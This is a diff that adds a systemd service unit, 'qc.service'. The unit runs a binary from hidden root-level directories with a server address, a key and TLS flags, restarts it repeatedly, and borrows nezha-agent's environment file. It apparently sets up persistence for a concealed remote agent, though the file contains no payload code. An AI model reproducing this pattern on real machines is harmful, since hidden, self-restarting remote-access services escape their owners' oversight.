@@ -1,0 +1,15 @@
+[Unit]
+Description=qc.service
+ConditionFileIsExecutable=/.qc/.qc/qc
+
+
+[Service]
+StartLimitInterval=5
+StartLimitBurst=10
+ExecStart=/.qc/.qc/qc "-s" "ipip:dkdk" "-p" "miyao" "--tls"
+WorkingDirectory=/root
+Restart=always
+RestartSec=120
+EnvironmentFile=-/etc/sysconfig/nezha-agent
+
+[Install]
